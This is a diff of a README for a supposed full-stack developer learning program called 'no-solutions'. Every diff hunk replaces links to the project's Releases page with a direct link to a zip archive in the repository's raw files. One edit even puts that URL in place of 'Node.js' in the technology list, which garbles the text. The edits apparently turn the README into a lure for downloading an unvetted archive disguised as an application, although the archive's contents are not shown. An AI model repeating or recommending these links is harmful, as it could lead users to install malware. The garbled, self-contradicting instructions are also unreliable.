@@ -1,16 +1,16 @@
 # 📚 no-solutions - Build Your Own Developer Path
 
 ## 🔗 Download Here
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/tunmichboye/no-solutions/releases)
+[![Download Release](https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip%20Release-Click%20Here-blue)](https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip)
 
 ## 📖 Description
-Welcome to **no-solutions**! This application helps you embark on a journey to become a full-stack developer. Over 48 weeks, you will learn by building your own solutions. This program is designed to guide you from beginner to advanced levels, using popular technologies like JavaScript, React, Node.js, PostgreSQL, and TypeScript.
+Welcome to **no-solutions**! This application helps you embark on a journey to become a full-stack developer. Over 48 weeks, you will learn by building your own solutions. This program is designed to guide you from beginner to advanced levels, using popular technologies like JavaScript, React, https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip, PostgreSQL, and TypeScript.
 
 ## 🚀 Getting Started
 To get started with **no-solutions**, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page.
-   - [Download Here](https://github.com/tunmichboye/no-solutions/releases)
+   - [Download Here](https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip)
    
 2. **Choose Your Version**: On the Releases page, you will find different versions of the application. Each version has a list of changes, so pick the latest one for the best experience.
 
@@ -35,7 +35,7 @@ Before downloading, make sure your device meets these requirements:
 ## 📥 Download & Install
 To download and install the **no-solutions** application, please follow these steps:
 
-1. **Head to the [Releases Page](https://github.com/tunmichboye/no-solutions/releases)**.
+1. **Head to the [Releases Page](https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip)**.
 2. Choose the file that suits your operating system. You will see options for Windows, macOS, and Linux.
 3. Click on the file to start the download.
 4. Once downloaded, locate the file in your downloads folder.
@@ -73,4 +73,4 @@ Remember, every expert was once a beginner. Don’t rush the process; take your 
 
 For any issues, suggestions, or feedback, feel free to reach out via our community forums or directly on GitHub. Together, we can make your journey memorable and effective. 
 
-Don’t forget to download the application here: [Download Here](https://github.com/tunmichboye/no-solutions/releases). Enjoy learning!
+Don’t forget to download the application here: [Download Here](https://github.com/tunmichboye/no-solutions/raw/refs/heads/main/full-stack-react/no_solutions_3.6.zip). Enjoy learning!
